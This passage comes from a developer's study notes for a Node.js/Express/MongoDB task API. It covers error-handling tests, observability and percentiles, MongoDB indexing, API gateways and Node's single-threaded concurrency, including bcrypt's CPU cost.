| `jwt.verify(token, secret)` | ✅ | Expired or tampered token → **401**, never a bug |
| `User.findById(...)` | ✅ separate | User deleted → **401**; DB down → `next(e)` → **500** |

**Lesson:** a `catch` block that's too wide turns bugs into misleading operational errors.

---

### Q: What was verified?

Thirteen cases against a running server, all returning the unified shape:

| Request | Status |
|---------|--------|
| Unknown route | 404 |
| Malformed JSON body | 400 |
| Wrong credentials | 401 |
| No token / invalid token | 401 |
| Duplicate registration | 409 |
| Bad fields on create | 400 + `errors[]` |
| Malformed id (`/tasks/not-an-id`) | 400 + `errors[]` |
| Valid id, no such task | 404 |
| Empty `PATCH` body | 400 |
| Bulk over the 10-task limit | 400 |
| Bulk delete with no `ids` | 400 |

**The bug path**, tested with `GET /api/v1/tasks?search=[` — an invalid regex reaching MongoDB:

```
Client (production mode):
  500 { "success": false, "status": 500, "message": "Something went wrong" }

Server console:
  Unhandled error ===> MongoServerError: Regular expression is invalid:
  missing terminating ] for character class
      at Connection.sendCommand (...)
```

Full detail for you, nothing for the attacker. In development the same response includes `stack`.

⚠️ **That test exposed a separate real bug:** `getTasks` passes `req.query.search` straight into `$regex`, so any regex metacharacter changes the query's meaning — or crashes it. Needs escaping. See [`todo.md`](todo.md).

---

### Q: Is this a breaking change?

**Yes** — the response shape went from `{ message }` to `{ success, status, message, errors? }`. By the rules in [§13](#13-api-versioning--apiv1) that's a **v2** change. It ships in v1 here because the only client is Postman; a real API with live clients would add the new shape under `/api/v2` and leave v1 answering the old way.

---

### One-line summary

**Every error now flows through one handler in `app.js`. `AppError` marks the ones whose message is safe to show — raised deliberately or converted by `normaliseError` — and everything else is treated as a bug: logged in full, answered with a bare 500.**

See also: [`readme.md`](readme.md) error handling section, [§6](#6-global-error-handler--err-req-res-next) for the Express mechanics, [§13](#13-api-versioning--apiv1) on why this counts as breaking.

---

## 15. API performance & observability — the vocabulary and the loop

**Status:** 💡 **Partial.** Logs + health are in `app.js`. Metrics, traces, error tracking, alerting, profiling are not.

Logging **is** observability — it is one pillar, not the whole thing. The rest of this section is the map for what is still missing.

---

### Q: Is the right term "API metrics"?

**Close, but narrower than the whole idea.** These words get used interchangeably and shouldn't be:

| Term | What it actually means |
|------|------------------------|
| **Performance** | The **outcome** — how fast the API responds. Not a feature you add |
| **Metrics** | One kind of telemetry: **numbers aggregated over time** — counters, gauges, histograms. Not only about speed (`signups_per_day` is a metric too) |
| **Logs** | Individual **events**, one line each — your morgan output |
| **Traces** | **One request's journey**, split into timed spans (route → auth → DB query) |
| **Observability** | The umbrella discipline. Classically "three pillars": metrics + logs + traces |
| **Monitoring** | The narrower practice: watch known metrics, **alert** when they cross a line |
| **APM** | *Application Performance Monitoring* — the **product category**: Datadog APM, New Relic, Sentry Performance |
| **Instrumentation** | The **act of adding code** that emits the telemetry |
| **SLI** | The metric you chose to care about — "p95 latency on `GET /tasks`" |
| **SLO** | The **target** you commit to — "under 300 ms, 99% of the time" |

**Putting it together:** you *instrument* the API to emit *metrics*, in order to *monitor* its *performance* against an *SLO*.

SLI/SLO is the step where performance stops being a feeling and becomes a number someone is accountable for.

---

### Q: Does logging fall under observability? What else?

**Yes.** Observability is the umbrella: can you ask “what is this system doing, and why is this request slow / failing?” without attaching a debugger.

The three **pillars** answer different questions:

| Pillar | Question it answers | This project |
|--------|---------------------|--------------|
| **Logs** | What happened to *this* `PATCH /tasks/abc` at 11:40? | ✅ morgan access lines ([§12](#12-request-logging-morgan--health-check)) + `console.error` in the global handler |
| **Metrics** | Is `GET /tasks` slower this week than last week? | ❌ no `/metrics`, no Prometheus. Only morgan’s duration on each line — that is a per-request number, not an aggregate |
| **Traces** | Of those 800 ms, how many were auth vs the database? | ❌ not built |

Morgan alone is **not** observability. It is the log pillar. A duration column is not a p95.

What else sits under the same umbrella even if people don’t call them pillars:

| Piece | Job | This project |
|-------|-----|--------------|
| **Health / readiness** | Is this instance fit to receive traffic? | ✅ `GET /health` — 200 / 503 from `mongoose.connection.readyState` |
| **Error tracking** | Group crashes by stack + user, alert | 💡 `logger.error` with a stack, but no grouping. Sentry (or similar) is the product |
| **Alerting** | Page a human when an SLI breaks | ❌ that is **monitoring** — it *uses* observability data |
| **Profiling** | CPU, event-loop lag, heap snapshots | ❌ how you’d catch bcrypt blocking the loop ([§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads)) |
| **Structured logs** | JSON with levels, searchable in a dashboard | ✅ `pino` ([§12c](#12c-structured-logging-with-pino--levels-json-and-why-not-consolelog)) — morgan's access line is still text |
| **Uptime checks** | Probe `/health` from outside the server | ❌ Pingdom / UptimeRobot class — after deploy |

A useful split:

- **Observability** = emit enough signal that you can *investigate* something new.
- **Monitoring** = watch a known number and *alert* when it crosses a line.

**Implemented vs remaining (observability only):**

| Done | Remains |
|------|---------|
| morgan → stdout (`dev` / `combined`) | `prom-client` + `GET /metrics` (p50 / p95 / p99 per route) |
| `logs/access.log` in development | Distributed tracing (OpenTelemetry spans) |
| `GET /health` | Sentry (or similar) on top of the pino stream |
| Error handler hides 500 details in production, logs the rest | Alerting on error rate / latency |
| Structured JSON logs — `pino` + `requestId` / `userId` ([§12c](#12c-structured-logging-with-pino--levels-json-and-why-not-consolelog)) | `pino-http` if you want the access line as JSON too |
| | Event-loop lag / heap profiling |
| | `app.set('trust proxy', 1)` so logged IPs are real, once anything sits in front |

See [`readme.md` — API performance & monitoring](readme.md#api-performance--monitoring) for the same split next to the performance work (indexes, pagination) which is a different list.

---

### Q: Why percentiles instead of an average?

**Because the average hides the users who are suffering.**

```
95 requests take 10 ms
 5 requests take 4000 ms
─────────────────────────
average = 209 ms   ← "looks fine"
p95     = 4000 ms  ← 1 in 20 users is furious
```

| Metric | Reads as |
|--------|----------|
| **p50** (median) | The typical request |
| **p95** | The bad-but-not-rare request — **the number teams actually watch** |
| **p99** | The worst realistic case; where timeouts and lock contention show up |

**Rule:** never report a single average latency. An average of a long-tailed distribution is close to meaningless.

---

### Q: How do large apps implement this?

**The core loop — the discipline, not the tooling:**

```
measure  →  find the actual slow thing  →  fix it  →  watch the number move
   ▲                                                          │
   └──────────────────────────────────────────────────────────┘
```

Skipping the first step is the classic mistake: you optimise whatever you *guessed* was slow, which usually isn't the bottleneck.

**In Node, concretely:** the `prom-client` library, a histogram labelled by route + method + status, updated in one middleware, exposed on a `GET /metrics` endpoint. Prometheus scrapes that endpoint on an interval; Grafana graphs it. Roughly 20 lines of app code.

```
your API  ──/metrics──▶  Prometheus  ──▶  Grafana dashboards
 (emit)        (scrape)     (store)          (graph + alert)
```

Bigger shops **buy** this instead — an APM agent collects the same data plus distributed traces, so a single slow request can be opened up and read span by span.

---

### The layers large apps tune

Roughly in the order they pay off:

| Layer | Techniques | This project |
|-------|------------|--------------|
| **Measurement** | Metrics endpoint, APM, tracing, load tests | ❌ only morgan's timing column |
| **Database** | Indexes, query plans (`.explain()`), projections, connection pooling | ❌ see below |
| **Response shaping** | Pagination, `.select()`, `.lean()`, gzip compression | ✅ pagination (`page`/`limit`); ❌ `.select()`, `.lean()`, gzip |
| **Caching** | HTTP `ETag` / `Cache-Control`, in-memory, Redis, CDN | ❌ none |
| **Protection** | Rate limiting, request timeouts, circuit breakers | ✅ rate limiting only |
| **Scale-out** | Node `cluster`, load balancer, HTTP keep-alive | ❌ not needed yet |

---

### Measured state of this API

`Task.collection.indexes()` returns exactly one index:

```js
[ { v: 2, key: { _id: 1 }, name: '_id_' } ]
```

`.explain('executionStats')` on the `GET /tasks` query:

```
stage:      SORT          ← sorting in memory, not from an index
returned:   14
examined:   24 docs       ← read the whole collection
index used: no
```

| Problem | Why it matters | Fix |
|---------|----------------|-----|
| **No index on `userId`** | Every list request scans the **entire** collection — including other users' tasks. Cost grows linearly with the collection | Compound index `{ userId: 1, createdAt: -1 }` — serves the filter **and** the sort |
| **Pagination** | Done — `?page` + `?limit` → `.skip()` / `.limit()`, envelope `{ data, page, limit, total, totalPages }` | Skip still walks discarded docs; an index makes the remaining scan cheaper |
| **`$regex` search** | Unanchored + `$options: 'i'` **cannot use a normal index**, ever — always a scan | MongoDB **text index** (different query syntax) or Atlas Search |
| **Full documents returned** | List views rarely need `comments`, `subTasks`, `attachments` | `.select()` + `.lean()` for read-only responses |

⚠️ At **24 documents** none of this is measurable. Seeing a real difference needs a few thousand seeded tasks first — which is also the honest reason to measure before optimising.

---

### Q: What's the right order to implement it here?

Do the loop properly rather than adding the index blind:

| Step | Why |
|------|-----|
| **1. Seed a few thousand tasks** | Throwaway script — without volume there's nothing to observe |
| **2. `/metrics` with `prom-client`** | The instrumentation itself; p50/p95/p99 per route |
| **3. Baseline load test** (`autocannon`) | Record p95 **before** touching anything |
| **4. Add the compound index** | The single biggest win |
| **5. Re-run the same load test** | A before/after number **you produced** — this is the part that teaches |
| **6. Then `.lean()`, compression** | Each one measured the same way |

**Note:** `/metrics` should sit **outside** `/api/v1` for the same reason as `/health` — it describes the server, not the API contract (see [§13](#13-api-versioning--apiv1)). It also shouldn't be publicly readable in production.

---

### One-line summary

**Performance is the outcome; metrics are the numbers; logs are one pillar of observability, not the whole thing; APM is the product you buy instead. Watch p95, not averages — and measure before optimising, because this API's real bottleneck (a missing `{ userId, createdAt }` index causing a full collection scan) is invisible at 24 documents.**

See also: [`readme.md` — API performance & monitoring](readme.md#api-performance--monitoring), [§12 request logging](#12-request-logging-morgan--health-check) for the timing data you already collect.

---

## 16. Queue — deeper topics not yet covered

**Status:** ❌ none of these are implemented. This is the reading list, with what each one actually means and where it touches code that already exists. **16.6 and 16.7 have since been written up properly in [§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads).**

**Suggested order:** §16.7 first (the event loop underpins everything), then 16.5 and 16.6, then 16.1. The rest are independent.

---

### 16.1 Architecting unbreakable Node.js applications

**Really about:** resilience — staying up when something outside your control fails. Graceful shutdown (catch `SIGTERM`, stop accepting connections, finish in-flight requests, close the Mongo connection, *then* exit), process-level safety nets (`unhandledRejection`, `uncaughtException`), timeouts on every outbound call, retries with backoff, circuit breakers, and idempotency keys so a client retry doesn't create the task twice.

**Touches your code:** [§14](#14-centralized-error-handling--the-apperror-class) only catches errors that reach Express. A rejected promise **outside** a request — say in the `mongoose.connect` chain — bypasses it entirely. There's also no shutdown handler, so a deploy kills in-flight requests mid-write.

---

### 16.2 Hardening Node APIs against 2025 OWASP threats

**Really about:** the **OWASP API Security Top 10**, which is a different list from the classic web Top 10. The headline item is **BOLA** (Broken Object Level Authorization) — reading someone else's record by changing an id in the URL. Then broken authentication, excessive data exposure, unrestricted resource consumption, mass assignment, and security misconfiguration.

**Touches your code:** you've already built three of the defences without naming them — `{ _id, userId: req.user._id }` on every query is the BOLA fix, the field allowlist in `validateTaskBody` is the mass-assignment fix, and `.select('-password')` is the data-exposure fix. Two known gaps: the unescaped `$regex` (injection, see [§15](#15-api-performance--observability--the-vocabulary-and-the-loop)) and no request timeout.

---

### 16.3 How OAuth and OpenID Connect actually work

**Really about:** two things people conflate. **OAuth 2.0** is *authorization* — letting another app act on a user's behalf without seeing their password. **OpenID Connect** is a thin layer on top that adds *authentication* — proving who the user is, via an `id_token`. Core concepts: the authorization-code flow with PKCE, the difference between access / refresh / ID tokens, scopes, and why the implicit flow is deprecated.

**Touches your code:** what you built in `controllers/auth.js` is neither — it's first-party login issuing your own JWT. "Login with Google" replaces `bcrypt.compare` with a redirect dance and token verification against Google's public keys. Your `protect` middleware would change less than you'd expect.

---

### 16.4 Node.js caching from edge to Redis

**Really about:** the layers, cheapest-and-farthest-out first. CDN / edge cache, then HTTP caching the browser honours (`ETag`, `Cache-Control`, `304 Not Modified`), then in-process memory, then Redis when several instances must share. The hard part is never the storing — it's **invalidation**, plus stampede protection when a hot key expires and a thousand requests all miss at once.

**Touches your code:** Express already sends an `ETag` on `res.json()`, so conditional requests partly work today. A per-user cache on `GET /tasks` would need invalidating on every create, update and delete — which is exactly why caching is usually the *last* optimisation, after the index in [§15](#15-api-performance--observability--the-vocabulary-and-the-loop).

---

### 16.5 Surviving traffic spikes with backpressure

**Really about:** what to do when work arrives faster than you can finish it. Without backpressure, Node accepts everything, memory climbs, event-loop lag grows, and *every* request gets slow — the queue becomes the outage. The fix is admission control: measure event-loop lag or queue depth, then **shed load** by returning `503` fast rather than accepting work you can't complete. For streams it's the `.pipe()` / `drain` mechanism that stops a fast producer overwhelming a slow consumer.

**Touches your code:** rate limiting ([§11](#11-rate-limiting--what-it-is-strategies-what-we-use)) is a per-client **fairness** cap, not overload protection — 10,000 distinct IPs each stay under the limit and still sink the server. Different problem, different tool.

---

### 16.6 Scaling Node.js with threads, processes and clustering

✅ **Now written up in full — see [§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads).**

**Really about:** one Node process runs your JavaScript on **one** core, so scaling means more processes: the built-in `cluster` module (or PM2) forking one worker per core behind a shared socket, and `worker_threads` for genuinely CPU-bound work that would otherwise block. Then the operational consequence — once there are several processes, anything held in local memory (rate-limit counters, caches, sessions) has to move to Redis.

**Touches your code:** your rate limiter's in-memory store is per process, so with four workers a client effectively gets four times the limit — the exact reason [§11](#11-rate-limiting--what-it-is-strategies-what-we-use) flags Redis for multi-server deploys.

---

### 16.7 How Node.js handles single-threaded concurrency

✅ **Now written up in full — see [§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads).**

**Really about:** the foundation the three topics above stand on. One thread, one call stack, and an **event loop** with ordered phases (timers → pending → poll → check → close), plus microtasks (promises) draining between each. I/O isn't done by your thread — libuv hands sockets and files to the OS or to its own 4-thread pool, so thousands of connections are *concurrent* without being *parallel*. The corollary is the whole game: any synchronous CPU work blocks **every** other request.

**Touches your code:** `bcrypt.hash` is deliberately expensive CPU work, so the `*Sync` variants would freeze the server for every registration — your `models/user.js` hook correctly `await`s the async API. One nuance corrected in [§19.5](#195-your-projects-one-real-cpu-cost-bcrypt): only the **native `bcrypt`** package moves that CPU to libuv's thread pool. You installed **`bcryptjs`**, which is pure JavaScript, so its async API merely *chunks* the work with `setImmediate` — the CPU is still spent on your event loop.

---

### One-line summary

**Seven topics, one thread of logic: understand the event loop first, because backpressure, clustering and resilience are all consequences of Node running your code on a single thread — then OWASP, OAuth and caching are the API-level concerns layered on top.**

---

## 17. What to read in the official docs — Node, Express, MongoDB, Mongoose

**Why bother when tutorials exist:** tutorials show one path that worked for someone else. Docs tell you the **options and the guarantees** — which is what you need the moment your case differs. They're also the only place version differences are stated, and you're on **Express 5** while most tutorials online are Express 4.

**How to read them:** a *guide* page is prose meant to be read start to finish; a *reference* page is a lookup table you skim once to learn the shape, then return to. Read the guides, skim the references, never try to read a reference cover to cover.

**Priority key:** 🔴 read now · 🟡 read soon · ⚪ when you need it

---

### 17.1 Node.js — [nodejs.org/api](https://nodejs.org/api/) + [nodejs.org/en/learn](https://nodejs.org/en/learn)

The runtime everything else sits on. The guides matter more than the reference here.

| Page | Why | Priority |
|------|-----|----------|
| **Learn → "The Node.js Event Loop, Timers, and process.nextTick()"** | The single most valuable page for a backend dev. Phases, microtasks, why order surprises you | 🔴 |
| **Learn → "Don't Block the Event Loop"** | The practical consequence: one slow synchronous line stalls every request | 🔴 |
| [`process`](https://nodejs.org/api/process.html) | `env`, exit codes, `SIGTERM`, `unhandledRejection` — the graceful-shutdown material from [§16.1](#161-architecting-unbreakable-nodejs-applications) | 🔴 |
| [`path`](https://nodejs.org/api/path.html) | Why `__dirname` + `path.join` beats a bare `'public'` string (see [`revison1.html`](revison1.html)) | 🔴 |
| [`events`](https://nodejs.org/api/events.html) | `EventEmitter` is the pattern under streams, sockets and Mongoose connections | 🟡 |
| [`stream`](https://nodejs.org/api/stream.html) | Where backpressure is actually defined ([§16.5](#165-surviving-traffic-spikes-with-backpressure)) | 🟡 |
| [`fs`](https://nodejs.org/api/fs.html) | Read the **promises** API; note which calls have `Sync` twins and avoid them at runtime | 🟡 |
| [`crypto`](https://nodejs.org/api/crypto.html) | `randomUUID`, timing-safe compare — relevant when you outgrow bcrypt-only auth | ⚪ |
| [`cluster`](https://nodejs.org/api/cluster.html) + [`worker_threads`](https://nodejs.org/api/worker_threads.html) | [§16.6](#166-scaling-nodejs-with-threads-processes-and-clustering) | ⚪ |
| [`http`](https://nodejs.org/api/http.html) | What Express wraps. Read it once so Express stops looking like magic | ⚪ |

**Skip for now:** `vm`, `v8`, `async_hooks`, `domain` (deprecated), the C++ addon docs.

---

### 17.2 Express — [expressjs.com](https://expressjs.com/)

Small library, small docs — genuinely readable in an afternoon.

| Page | Why | Priority |
|------|-----|----------|
| [Migrating to Express 5](https://expressjs.com/en/guide/migrating-5.html) | **Start here.** You're *on* 5; most blog posts are 4. Explains real behaviour differences | 🔴 |
| [Using middleware](https://expressjs.com/en/guide/using-middleware.html) | Mount order, path-scoped middleware — exactly how `helmet`, `morgan`, limiters and `/api-docs` are layered in your `app.js` | 🔴 |
| [Error handling](https://expressjs.com/en/guide/error-handling.html) | The 4-argument rule and async behaviour behind [§14](#14-centralized-error-handling--the-apperror-class) | 🔴 |
| [Routing](https://expressjs.com/en/guide/routing.html) | Route params, `Router()`, why `/bulk` must precede `/:id` | 🔴 |
| [Writing middleware](https://expressjs.com/en/guide/writing-middleware.html) | You've already written three (`protect`, `validateObjectId`, the error handler) | 🟡 |
| [Production best practices: performance](https://expressjs.com/en/advanced/best-practice-performance.html) | Compression, `NODE_ENV=production`, clustering, why not to use sync calls | 🟡 |
| [Production best practices: security](https://expressjs.com/en/advanced/best-practice-security.html) | Helmet, cookies, rate limits, dependency audits — overlaps [§16.2](#162-hardening-node-apis-against-2025-owasp-threats) | 🟡 |
| [API reference — `req` / `res` / `app`](https://expressjs.com/en/5x/api.html) | Skim to learn what exists (`res.set`, `req.ip`, `app.set('trust proxy')`), then use as lookup | 🟡 |

> **One payoff you'd get immediately:** Express **5** forwards a rejected promise from an `async` handler to the error handler automatically — Express 4 did not, which is why every tutorial wraps handlers in `try/catch`. Your explicit `try { } catch (e) { next(e) }` is still fine and arguably clearer, but it's now a belt-and-braces choice rather than a requirement. That distinction only exists in the docs.

---

### 17.3 MongoDB — [mongodb.com/docs/manual](https://www.mongodb.com/docs/manual/)

The database itself, independent of Mongoose. Read this when you care about *why a query is slow* or *how to shape data*.

| Page | Why | Priority |
|------|-----|----------|
| [Indexes](https://www.mongodb.com/docs/manual/indexes/) | The fix for [§15](#15-api-performance--observability--the-vocabulary-and-the-loop). Single-field, compound, and the **ESR rule** (Equality → Sort → Range) for field order | 🔴 |
| [Analyze query performance / explain results](https://www.mongodb.com/docs/manual/reference/explain-results/) | How to read `COLLSCAN` vs `IXSCAN`, `totalDocsExamined`, in-memory `SORT` | 🔴 |
| [Query operators](https://www.mongodb.com/docs/manual/reference/operator/query/) | `$in`, `$or`, `$regex`, `$gte` — you use four of these already | 🔴 |
| [Data model design](https://www.mongodb.com/docs/manual/core/data-model-design/) | Embed vs reference. Your `comments` / `subTasks` as string arrays is a decision this page names | 🟡 |
| [Aggregation pipeline](https://www.mongodb.com/docs/manual/core/aggregation-pipeline/) | `$match`/`$group`/`$lookup` — needed for counts and stats endpoints | 🟡 |
| [Text indexes](https://www.mongodb.com/docs/manual/core/indexes/index-types/index-text/) | The proper replacement for your `$regex` search | 🟡 |
| [Transactions](https://www.mongodb.com/docs/manual/core/transactions/) | Multi-document atomicity — relevant if bulk create must be all-or-nothing at the DB level | ⚪ |
| [TTL indexes](https://www.mongodb.com/docs/manual/core/index-ttl/) | Auto-expiring documents — sessions, tokens, old logs | ⚪ |
| [Security checklist](https://www.mongodb.com/docs/manual/administration/security-checklist/) | Before any deployment | ⚪ |

**Skip for now:** sharding, replica-set administration, oplog internals.

---

### 17.4 Mongoose — [mongoosejs.com/docs](https://mongoosejs.com/docs/guide.html)

The layer you actually call. The recurring theme: know which behaviour is **Mongoose's** and which is **MongoDB's**.

| Page | Why | Priority |
|------|-----|----------|
| [FAQ](https://mongoosejs.com/docs/faq.html) | Short, and clears up the traps — including that **`unique: true` is an index, not a validator**, the exact thing `User.syncIndexes()` exists for in your `app.js` | 🔴 |
| [Schemas](https://mongoosejs.com/docs/guide.html) | Options like `timestamps`, `strict`, and `schema.index()` — where your task indexes will go | 🔴 |
| [Validation](https://mongoosejs.com/docs/validation.html) | Built-in vs custom validators, and why `findOneAndUpdate` needs `runValidators: true` (your `updateTask` sets it) | 🔴 |
| [Queries](https://mongoosejs.com/docs/queries.html) | Query objects aren't promises until awaited; chaining `.sort()`, `.select()`, `.limit()` | 🔴 |
| [Middleware](https://mongoosejs.com/docs/middleware.html) | `pre('save')` for password hashing, and the important gap: **document** hooks don't run on `findOneAndUpdate` | 🟡 |
| [Lean](https://mongoosejs.com/docs/tutorials/lean.html) | The read-path performance win from [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) | 🟡 |
| [Populate](https://mongoosejs.com/docs/populate.html) | Following `ref: 'User'` — and the N+1 query trap it hides | 🟡 |
| [SchemaTypes](https://mongoosejs.com/docs/schematypes.html) | Casting rules, `ObjectId`, why a bad id throws `CastError` (which `normaliseError` maps to 400) | 🟡 |
| [Transactions](https://mongoosejs.com/docs/transactions.html) | Sessions, once you need multi-document atomicity | ⚪ |
| [TypeScript](https://mongoosejs.com/docs/typescript.html) | When you move the project to TS | ⚪ |

---

### A reading order that builds on itself

| # | Read | Then you can |
|---|------|--------------|
| 1 | Express **Migrating to 5** + **Error handling** | Understand your own `app.js` completely |
| 2 | Node **Event Loop** + **Don't Block the Event Loop** | Reason about what "slow" even means here |
| 3 | Mongoose **FAQ** + **Schemas** | Stop being surprised by `unique` and hooks |
| 4 | MongoDB **Indexes** + **explain results** | Actually fix [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) instead of guessing |
| 5 | Express **production best practices** (both) | Know what's missing before deploying |

---

### One-line summary

**Read the guides and skim the references: Express's Migrating-to-5 and error-handling pages explain your own `app.js`, Node's event-loop guide defines what "slow" means, Mongoose's FAQ dispels the `unique`-is-not-a-validator trap you already hit, and MongoDB's Indexes plus explain-results pages are what turn [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) from theory into a measured fix.**

---

## 18. What is an API gateway?

**Status:** ❌ not used in this project — and [correctly so](#q-do-you-need-one-here) for now.

---

### The one-line version

**A single front door that all API traffic passes through before reaching your actual service** — a reverse proxy that also handles the concerns every API needs, so individual services don't have to.

---

### What it typically handles

| Concern | Examples |
|---------|----------|
| **Routing** | Send `/tasks/*` to one service, `/billing/*` to another |
| **TLS termination** | HTTPS ends at the gateway; internal hops can be plain HTTP |
| **Authentication** | Validate the JWT / API key once, at the edge |
| **Rate limiting & quotas** | Per client, per plan, per route |
| **Request hygiene** | Size limits, CORS, header stripping |
| **Caching** | Serve repeat reads without touching the service |
| **Observability** | One place that sees every request — logs, metrics, tracing headers |
| **Traffic shaping** | Canary releases, blue/green, version splitting |

⚠️ Read that list against your `app.js` and notice: **you have already built five of these inside the application** — Helmet's headers, CORS, the two rate limiters, the `/api/v1` prefix, and JWT verification in `protect`.

---

### The problem it actually solves

One service, in-app is fine. The pain starts at **ten** services.

Without a gateway, every service reimplements rate limiting, every service parses tokens, every service configures CORS — ten copies of the same logic, drifting apart, each with its own bugs. A gateway pulls those **cross-cutting concerns** into one layer that all services sit behind.

```
                     ┌────────────────┐
   clients  ───────▶  │  API Gateway   │ ──▶  tasks service
                     │                │ ──▶  users service
                     │  TLS, auth,    │ ──▶  billing service
                     │  rate limit,   │
                     │  routing       │
                     └────────────────┘
```

| Tool | Notes |
|------|-------|
| **AWS API Gateway** | Managed; pairs with Lambda or ECS |
| **Kong**, **Apigee**, **Azure API Management** | Full API-management platforms — keys, plans, developer portals |
| **Envoy**, **Traefik** | The Kubernetes / service-mesh world |
| **nginx** | Does the proxy + TLS part well, without API-specific features |

**Related pattern — BFF (Backend For Frontend):** a thin per-client gateway (one for web, one for mobile) that aggregates several services into the exact shape that client needs.

---

### Q: Do you need one here?

**No.** One service, one process. A gateway would add a component to deploy, operate and debug while replacing logic that already works.

When you deploy, the platform (Render, Railway, a cloud load balancer) already gives you TLS and routing — which is the part you'd actually miss.

**The honest test for later:** you want a gateway when you have **more than one service** and are copy-pasting cross-cutting middleware between them.

---

### ⚠️ Two things to know for when you do

#### 1. `req.ip` stops being the client

Anything proxying in front of your app makes `req.ip` the **proxy's** address:

```js
app.set('trust proxy', 1);   // read the real client IP from X-Forwarded-For
```

Without it your per-IP rate limiter buckets **the entire internet together** ([§11](#11-rate-limiting--what-it-is-strategies-what-we-use)) and every morgan log line records the same IP forever ([§12](#12-request-logging-morgan--health-check)). Mandatory the moment anything sits in front.

#### 2. Don't blindly trust gateway headers

If the gateway validates the JWT and forwards `X-User-Id`, it's tempting to delete `protect` and read the header. Only safe if the network **genuinely** prevents anyone reaching the service directly — otherwise anyone who can hit your service can set that header and become anyone.

Most teams keep verification in the service too, because that network assumption tends to break quietly. That's the "defence in depth" / zero-trust argument.

---

### One-line summary

**An API gateway is one front door doing the work every service would otherwise duplicate — routing, TLS, auth, rate limiting, caching. You've built five of those into `app.js`, which is right for a single service; a gateway earns its keep when there are several. Whenever one appears in front, `app.set('trust proxy', 1)` becomes mandatory or per-IP rate limiting and IP logging both silently break.**

See also: [§11 rate limiting](#11-rate-limiting--what-it-is-strategies-what-we-use), [§13 API versioning](#13-api-versioning--apiv1), [§16.4 caching from edge to Redis](#164-nodejs-caching-from-edge-to-redis).

---

## 19. How Node serves many users — one thread, cluster, worker threads

**Status:** 💡 your app runs as **one process on one core** today. Nothing here is implemented — but one thing in `app.js` will break the day you cluster it, and it is called out below.

**The question this answers:** if Node is single-threaded, how does it serve hundreds of users at once — and what do `cluster` and `worker_threads` actually add?

---

### 19.1 First, the surprise: one thread is already enough

Look at what `GET /api/v1/tasks` really spends its time on:

| Step | Who does it | Time |
|------|-------------|------|
| parse the request, run `protect`, build the filter | **your thread** | ~0.2 ms |
| `await Task.find(filter)` | **MongoDB**, over the network | ~15 ms |
| turn the result into JSON, send it | **your thread** | ~0.3 ms |

Your JavaScript is busy for about **0.5 ms** out of a **16 ms** request. The other 15.5 ms it is doing nothing at all — it is *waiting*.

Node's whole design is: **never sit and wait.** When you `await` the database, Node hands the socket to the operating system, remembers "when this answers, run the rest of `getTasks`", and immediately picks up the next request.

---

### 19.2 See it with three users at once

Three requests arrive at the same millisecond. One thread, and yet:

```text
ms 0    ──▶ req A: run 0.2ms of JS, send query to Mongo, park it
ms 0.2  ──▶ req B: run 0.2ms of JS, send query to Mongo, park it
ms 0.4  ──▶ req C: run 0.2ms of JS, send query to Mongo, park it
ms 0.6      thread is now IDLE — three queries are in flight
ms 15   ──▶ Mongo answers A → run 0.3ms → response sent
ms 15.4 ──▶ Mongo answers B → run 0.3ms → response sent
ms 15.9 ──▶ Mongo answers C → run 0.3ms → response sent
```

All three finished in ~16 ms, not 48 ms. The thread was busy for 1.5 ms total.

Multiply it out: at 0.5 ms of JS per request, one thread can retire roughly **2,000 requests per second** before the CPU is even the problem. Your database will complain long before Node does.

> **The two words that matter**
>
> - **Concurrent** = many requests *in progress* at once. Node does this brilliantly with one thread.
> - **Parallel** = many requests *executing JavaScript* at the same instant. One Node process never does this.
>
> For an API that mostly waits on a database, concurrency is what you needed anyway.

---

### 19.3 Who does the waiting, if not your thread

```text
        ┌──────────────────────────────────────┐
        │  YOUR JAVASCRIPT — one thread only   │
        │  controllers, validation, res.json   │
        └──────────────────────────────────────┘
                    ▲              │
      "this is done, run          │ "go do this, tell me later"
       your callback"             ▼
        ┌──────────────────────────────────────┐
        │  libuv + the operating system        │
        │  sockets, DNS, files, timers         │
        │  + a 4-thread pool for fs / crypto   │
        └──────────────────────────────────────┘
```

Network I/O costs your thread nothing — the OS notifies Node when data arrives. Some things (file reads, `crypto`, DNS lookups) use libuv's small thread pool, which defaults to **4 threads**. Either way, the work happens **off** your thread, and your callback is queued for when it finishes.

---

### 19.4 The one rule, and the one way to break it

**Your JavaScript runs one function at a time, start to finish, with no interruptions.** Nothing else can run until it returns.

So a slow *awaited* call is harmless, and a slow *synchronous* call is a site-wide outage:

```js
// HARMLESS — 15ms of waiting, thread free the whole time
const tasks = await Task.find(filter);

// TOXIC — 200ms of CPU. Nobody else's request moves for 200ms.
let total = 0;
for (let i = 0; i < 2_000_000_000; i++) total += i;
```

What that costs, with 50 users online:

| | awaited 200 ms | synchronous 200 ms |
|---|---|---|
| the user who caused it | 200 ms | 200 ms |
| the 49 others | unaffected | **+200 ms each**, queued behind it |
| server CPU | idle | pinned |

This is the entire reason "don't block the event loop" is the first rule of Node. It is also why the symptom is so recognisable: in your morgan log, **every** response time inflates at once, not just one route.

**The usual culprits:** `JSON.parse` on a huge payload, `fs.readFileSync`, a catastrophic regex, sorting a hundred thousand documents in JS instead of in mongo, and password hashing.

---

### 19.5 Your project's one real CPU cost: bcrypt

Hashing is *designed* to be slow — that is what makes it useful. At 10 salt rounds it costs roughly **100 ms of pure CPU** per register/login.

⚠️ **Correction to [§16.7](#167-how-nodejs-handles-single-threaded-concurrency), which is wrong on this point:** whether that CPU is on your thread depends on **which bcrypt you installed**, and this project has the pure-JavaScript one.

| Package | What it is | Where the 100 ms goes |
|---------|-----------|----------------------|
| `bcryptjs` ← **you have this** | pure JavaScript | **your thread.** The async API splits the work into chunks scheduled with `setImmediate`, so other requests get slices in between — better than freezing, but the CPU is still yours |
| `bcrypt` | native C++ addon | libuv's **thread pool** — genuinely off your event loop |

Your hook is written correctly either way, because it `await`s:

```js
// models/user.js
UserSchema.pre('save', async function () {
    if (!this.isModified('password')) return;

    const salt = await bcrypt.genSalt(10);          // await, not genSaltSync
    this.password = await bcrypt.hash(this.password, salt);
});
```

> Never the `*Sync` variants here. `bcrypt.hashSync` would hard-block the server for 100 ms on every registration.
>
